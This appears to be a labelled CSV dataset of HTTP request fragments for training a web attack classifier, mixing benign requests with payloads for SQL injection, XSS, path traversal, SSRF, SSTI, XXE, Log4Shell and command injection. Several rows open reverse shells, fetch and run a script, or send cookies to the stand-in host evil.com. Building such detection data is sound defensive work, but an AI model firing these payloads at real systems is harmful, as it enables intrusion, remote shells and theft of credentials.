text,label,attack_type,severity
"GET /search?input=%3Cdiv%20style=%27background:url%28javascript:alert%281%29%29%27%3E HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=../etc/passwd,1,path_traversal,medium
Referer: http://target.com/?q=${jndi:dns://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=1' ORDER BY 1--",1,sql_injection,high
POST /api/cart add item=3,0,normal,none
"Referer: http://target.com/?q=1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29,1,1%29%29%3E64--",1,sql_injection,high
User-Agent: ${self.module.cache.util.os.system('id')},1,ssti,high
"GET /search?input=http://localhost/admin HTTP/1.1
Host: target.com",1,ssrf,high
Referer: http://target.com/?q=%7Cwhoami,1,command_injection,critical
"GET /page?id=javascript:alert%281%29 HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id=../../../../etc/passwd%00 HTTP/1.1
Host: target.com",1,path_traversal,medium
X-Forwarded-For: username=tomcat&password=tomcat,1,brute_force,low
"X-Forwarded-For: 1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=/etc/passwd%00.php",1,path_traversal,medium
"GET /page?id=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: username=admin&password=%27%20OR%20%271%27=%271,1,sql_injection,high
Referer: http://target.com/?q=%3Cimg%20src=x%20onerror=alert%28%27XSS%27%29%3E,1,xss,medium
"GET /page?id=%27%20OR%20%271%27=%271 HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=../../../../var/log/apache2/access.log HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=http://169.254.169.254/latest/meta-data/ HTTP/1.1
Host: target.com",1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3CIMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert%28%27XSS%27%29%3E",1,xss,medium
GET /blog/ar HTTP/1.1,0,normal,none
%27%20OR%201=1/*,1,sql_injection,high
email=admin@admin.com&password=admin,1,brute_force,low
"GET /page?id=User-Agent:%20${jndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
|%20nc%20evil.com%204444%20-e%20/bin/sh,1,command_injection,critical
GET /docs/javascript.html,0,normal,none
Referer: http://target.com/?q=http://127.0.0.1:8080/admin,1,ssrf,high
http://127.0.0.1:8080/admin,1,ssrf,high
GET /users/3/profile HTTP/1.1,0,normal,none
username=admin&password=,1,brute_force,low
POST /api/cart add item=contact,0,normal,none
GET /blog/en HTTP/1.1,0,normal,none
"GET /search?input=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1
Host: target.com",1,path_traversal,medium
%27%20OR%20pg_sleep%285%29--,1,sql_injection,high
PUT /api/users/contact/settings,0,normal,none
${jndi:rmi://evil.com/a},1,log4shell,critical
"GET /search?input=..././..././..././etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /page?id={%%20for%20c%20in%20[].__class__.__base__.__subclasses__%28%29%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}{{%20c.__init__.__globals__[%27__builtins__%27].open%28%27/etc/passwd%27%29.read%28%29%20}}{%%20endif%20%}{%%20endfor%20%} HTTP/1.1
Host: target.com",1,ssti,high
User-Agent: ftp://127.0.0.1:21,1,ssrf,high
|%20ps%20aux,1,command_injection,critical
User-Agent: %3Cvideo%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"GET /page?id=|%20cat%20/etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: Authorization: Basic dGVzdDp0ZXN0,1,brute_force,low
X-Forwarded-For: http://127.0.0.1/admin,1,ssrf,high
create new post title=mobile-apps,0,normal,none
User-Agent: ....//....//....//etc/passwd,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20root%20[%3C!ENTITY%20test%20SYSTEM%20%22file:///etc/hostname%22%3E]%3E%3Croot%3E&test;%3C/root%3E",1,xxe,high
../../../../etc/shadow,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=${${upper:j}ndi:ldap://evil.com/a}",1,log4shell,critical
"GET /search?input=%3Cobject%20data=javascript:alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
%3Cbase%20href=%27javascript:alert%281%29//%27%3E%3Ca%20href=/%3Eclick%3C/a%3E,1,xss,medium
Referer: http://target.com/?q=<svg onload=alert(1)>,1,xss,medium
Referer: http://target.com/?q=<scr<script>ipt>alert(1)</scr</script>ipt>,1,xss,medium
User-Agent: username=admin&password=password123,1,brute_force,low
"GET /page?id=1%27%20ORDER%20BY%201-- HTTP/1.1
Host: target.com",1,sql_injection,high
User-Agent: %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,1,path_traversal,medium
1%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20information_schema.tables%29%3E0--,1,sql_injection,high
GET /users/25/profile HTTP/1.1,0,normal,none
upload image photo_february.jpg,0,normal,none
GET /images/march.png,0,normal,none
Referer: http://target.com/?q=${jndi:ldap://127.0.0.1:1389/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%201=1--",1,sql_injection,high
"GET /search?input=%27%20OR%201=1# HTTP/1.1
Host: target.com",1,sql_injection,high
"content-type: application/json
body: {{""name"":""faq""}}",0,normal,none
User-Agent: %27%20AND%20EXISTS%28SELECT%20*%20FROM%20users%29--,1,sql_injection,high
User-Agent: ${${upper:j}ndi:ldap://evil.com/a},1,log4shell,critical
Referer: http://target.com/?q=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
X-Forwarded-For: <script>alert(1)</script>,1,xss,medium
Referer: http://target.com/?q=${jndi:ldap://evil.%63om/a},1,log4shell,critical
POST /api/cart add item=web-development,0,normal,none
upload image photo_python.jpg,0,normal,none
POST /api/cart add item=products,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=1 OR 1=1",1,sql_injection,high
"GET /search?input=;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: ;%20ls%20-la,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22http://evil.com/evil.dtd%22%3E%20%xxe;]%3E",1,xxe,high
GET /users/json/profile HTTP/1.1,0,normal,none
X-Forwarded-For: ${jndi:ldap://evil.com/${java:os}},1,log4shell,critical
"X-Forwarded-For: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/shadow"">]><foo>&xxe;</foo>",1,xxe,high
"<!DOCTYPE foo [<!ENTITY xxe ""test""> <!ENTITY xxe2 ""&xxe;&xxe;&xxe;"">]>",1,xxe,high
X-Forwarded-For: file:///c:/boot.ini,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=/etc/passwd%00.php",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cdiv%20style=%27background:url%28javascript:alert%281%29%29%27%3E",1,xss,medium
Referer: http://target.com/?q=file:///c:/windows/win.ini,1,path_traversal,medium
GET /category/en/items,0,normal,none
"GET /search?input=xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E HTTP/1.1
Host: target.com",1,xxe,high
delete item id=100,0,normal,none
User-Agent: gopher://127.0.0.1:6379/_INFO,1,ssrf,high
"GET /page?id=| ifconfig HTTP/1.1
Host: target.com",1,command_injection,critical
User-Agent: username=administrator&password=administrator,1,brute_force,low
Referer: http://target.com/?q=gopher://127.0.0.1:6379/_INFO,1,ssrf,high
User-Agent: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20lolz%20[%3C!ENTITY%20lol%20%22lol%22%3E%3C!ENTITY%20lol9%20%22&lol;&lol;&lol;%22%3E]%3E%3Cfoo%3E&lol9;%3C/foo%3E,1,xxe,high
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20UNION%20SELECT%20username,password%20FROM%20users--",1,sql_injection,high
"GET /page?id=1' AND SLEEP(5)-- HTTP/1.1
Host: target.com",1,sql_injection,high
Referer: http://target.com/?q=1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200--,1,sql_injection,high
"POST /api/feedback body={{""message"":""python""}}",0,normal,none
|%20ls%20-la,1,command_injection,critical
User-Agent: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///etc/shadow%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
"GET /search?input={{range.constructor('return global.process.mainModule.require(""child_process"").execSync(""id"")')()}} HTTP/1.1
Host: target.com",1,ssti,high
X-Forwarded-For: User-Agent: ${jndi:ldap://evil.com/a},1,log4shell,critical
;%20nc%20-e%20/bin/bash%20evil.com%204444,1,command_injection,critical
X-Forwarded-For: %27%20OR%20SLEEP%285%29--,1,sql_injection,high
Referer: http://target.com/?q=http://127.0.0.1#evil.com,1,ssrf,high
"GET /search?input=%3Ca%20href=%27javascript:alert%281%29%27%3Eclick%3C/a%3E HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id={{range.constructor%28%27return%20global.process.mainModule.require%28%22child_process%22%29.execSync%28%22id%22%29%27%29%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
User-Agent: username=tomcat&password=tomcat,1,brute_force,low
"GET /search?input=../../../../var/www/html/config.php HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /search?input=id=1%27%20AND%20%271%27=%271 HTTP/1.1
Host: target.com",1,sql_injection,high
%3Cscript%3Edocument.location=%27http://evil.com/steal?c=%27+document.cookie%3C/script%3E,1,xss,medium
"GET /page?id=<svg onload=alert(document.domain)> HTTP/1.1
Host: target.com",1,xss,medium
"GET /page?id=%0a%20cat%20/etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=http://192.168.1.1/admin",1,ssrf,high
search query for database,0,normal,none
User-Agent: javascript:alert(1),1,xss,medium
GET /users/xlsx/profile HTTP/1.1,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=username=root&password=root",1,brute_force,low
GET /blog/size HTTP/1.1,0,normal,none
"GET /page?id=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/orders body={{""item"":""xlsx""}}",0,normal,none
X-Forwarded-For: {{[].__class__.__base__.__subclasses__()}},1,ssti,high
%27%20OR%20pg_sleep%285%29--,1,sql_injection,high
"GET /page?id=%3Csvg%20onload=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1,xss,medium
PUT /api/users/price/settings,0,normal,none
username=laptops&action=login,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=|%20cat%20/etc/shadow",1,command_injection,critical
"GET /search?input=|%20cat%20/etc/passwd HTTP/1.1
Host: target.com",1,command_injection,critical
%3CIMG%20SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert%28%27XSS%27%29%3E,1,xss,medium
"GET /search?input=username=guest&password=guest HTTP/1.1
Host: target.com",1,brute_force,low
X-Forwarded-For: redirect=http://169.254.169.254,1,ssrf,high
GET /blog/csv HTTP/1.1,0,normal,none
"Referer: http://target.com/?q=1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
User-Agent: admin%27%20#,1,sql_injection,high
Referer: http://target.com/?q=%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
Referer: http://target.com/?q=http://localhost/admin,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=<p onmouseover='alert(1)'>hover</p>",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200--",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%3C#assign%20ex=%22freemarker.template.utility.Execute%22?new%28%29%3E${ex%28%22id%22%29}",1,ssti,high
User-Agent: %27%20AND%20EXISTS%28SELECT%20*%20FROM%20users%29--,1,sql_injection,high
"GET /page?id=username=root&password=toor HTTP/1.1
Host: target.com",1,brute_force,low
"GET /search?input=id=1 AND 1=CONVERT(int,@@version)-- HTTP/1.1
Host: target.com",1,sql_injection,high
search query for tablets,0,normal,none
view page number javascript,0,normal,none
X-Forwarded-For: |%20whoami,1,command_injection,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%2e%2e/%2e%2e/%2e%2e/etc/passwd",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%27;%20UPDATE%20users%20SET%20password=%27hacked%27%20WHERE%20%271%27=%271%27--",1,sql_injection,high
Referer: http://target.com/?q=%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"POST /api/orders body={{""item"":""100""}}",0,normal,none
http://127.0.0.1:3306,1,ssrf,high
delete item id=smartphones,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=..\..\..\..\windows\system32\drivers\etc\hosts",1,path_traversal,medium
User-Agent: ${jndi:ldap://evil.com/${java:os}},1,log4shell,critical
1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--,1,sql_injection,high
GET /docs/ar.html,0,normal,none
load data from products,0,normal,none
"GET /search?input=1%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
GET /images/red.png,0,normal,none
GET /users/cloud-computing/profile HTTP/1.1,0,normal,none
"GET /page?id=%3Cbase%20href=%27javascript:alert%281%29//%27%3E%3Ca%20href=/%3Eclick%3C/a%3E HTTP/1.1
Host: target.com",1,xss,medium
Referer: http://target.com/?q=http://172.16.0.1/admin,1,ssrf,high
"POST /api/feedback body={{""message"":""machine-learning""}}",0,normal,none
%3C/script%3E%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%20%271%27=%271%27--",1,sql_injection,high
POST /api/cart add item=price,0,normal,none
....\....\....\etc\passwd,1,path_traversal,medium
"GET /page?id=;%20env HTTP/1.1
Host: target.com",1,command_injection,critical
Referer: http://target.com/?q=..%2f..%2f..%2fetc%2fpasswd,1,path_traversal,medium
username=database&action=login,0,normal,none
edit comment id=python,0,normal,none
X-Forwarded-For: %3Csvg%20onload=alert%28document.domain%29%3E,1,xss,medium
POST /api/cart add item=john_doe,0,normal,none
"GET /page?id=http://192.168.1.1/admin HTTP/1.1
Host: target.com",1,ssrf,high
"GET /page?id={{%27%27.__class__.__mro__[2].__subclasses__%28%29}} HTTP/1.1
Host: target.com",1,ssti,high
"POST /api/data HTTP/1.1
Host: target.com

input=http://169.254.169.254/latest/meta-data/iam/security-credentials/",1,ssrf,high
"User-Agent: '""><script>alert(1)</script>",1,xss,medium
"GET /search?input=%27%20GROUP%20BY%201-- HTTP/1.1
Host: target.com",1,sql_injection,high
<iframe src=javascript:alert(1)>,1,xss,medium
User-Agent: ; netstat -an,1,command_injection,critical
Referer: http://target.com/?q=<div style='background:url(javascript:alert(1))'>,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=id=1%27%20AND%20%271%27=%271",1,sql_injection,high
GET /users/user123/profile HTTP/1.1,0,normal,none
sort items by date ascending,0,normal,none
GET /category/date/items,0,normal,none
User-Agent: http://127.0.0.1:9200,1,ssrf,high
"GET /search?input=;%20whoami HTTP/1.1
Host: target.com",1,command_injection,critical
X-Forwarded-For: %3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"GET /page?id=/etc/passwd%00 HTTP/1.1
Host: target.com",1,path_traversal,medium
Referer: http://target.com/?q=%27;%20EXEC%20xp_cmdshell%28%27whoami%27%29--,1,sql_injection,high
%3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://evil.com/xxe%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
"GET /search?input=%3Cvideo%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20UNION%20SELECT%20username,password%20FROM%20users--",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=redirect=http://169.254.169.254",1,ssrf,high
Referer: http://target.com/?q=%3Ciframe%20src=javascript:alert%281%29%3E,1,xss,medium
Referer: http://target.com/?q=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a},1,log4shell,critical
X-Forwarded-For: %3C?xml%20version=%221.0%22?%3E%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22file:///c:/windows/win.ini%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
%3Clink%20rel=import%20href=javascript:alert%281%29%3E,1,xss,medium
X-Forwarded-For: #set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor(),1,ssti,high
GET /docs/report-january.html,0,normal,none
"GET /search?input=http://169.254.169.254/latest/user-data HTTP/1.1
Host: target.com",1,ssrf,high
X-Forwarded-For: ; env,1,command_injection,critical
"GET /page?id=username=admin&password=%27%20OR%20%271%27=%271 HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=`cat%20/etc/passwd`",1,command_injection,critical
X-Forwarded-For: %3C%=%207*7%20%%3E,1,ssti,high
%3C!DOCTYPE%20foo%20[%3C!ENTITY%20xxe%20SYSTEM%20%22expect://id%22%3E]%3E%3Cfoo%3E&xxe;%3C/foo%3E,1,xxe,high
Referer: http://target.com/?q=%27%20OR%20%271%27=%271,1,sql_injection,high
"GET /search?input=%27%20OR%201=1# HTTP/1.1
Host: target.com",1,sql_injection,high
GET /products/csv HTTP/1.1,0,normal,none
GET /search?q=javascript&page=1,0,normal,none
../../../../etc/passwd,1,path_traversal,medium
X-Forwarded-For: |%20ifconfig,1,command_injection,critical
X-Forwarded-For: %3Cvideo%20src=x%20onerror=alert%281%29%3E,1,xss,medium
GET /docs/2024.html,0,normal,none
GET /users/web-development/profile HTTP/1.1,0,normal,none
download file march.pdf,0,normal,none
"X-Forwarded-For: <?xml version=""1.0""?><!DOCTYPE foo [<!ENTITY xxe SYSTEM ""php://filter/convert.base64-encode/resource=/etc/passwd"">]><foo>&xxe;</foo>",1,xxe,high
export report tablets,0,normal,none
Referer: http://target.com/?q=' OR 'x'='x,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",1,path_traversal,medium
"GET /search?input=%3Cbase%20href=%27javascript:alert%281%29//%27%3E%3Ca%20href=/%3Eclick%3C/a%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/feedback body={{""message"":""home""}}",0,normal,none
X-Forwarded-For: %3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E,1,xss,medium
"POST /api/feedback body={{""message"":""1""}}",0,normal,none
"Referer: http://target.com/?q=1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'",1,sql_injection,high
GET /category/jane_smith/items,0,normal,none
Referer: http://target.com/?q=${jndi:rmi://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=onmouseover=alert%281%29",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.com/a}",1,log4shell,critical
Authorization:%20Basic%20YWRtaW46YWRtaW4=,1,brute_force,low
PUT /api/users/invoice-2024/settings,0,normal,none
edit comment id=user123,0,normal,none
Authorization:%20Basic%20cm9vdDpyb290,1,brute_force,low
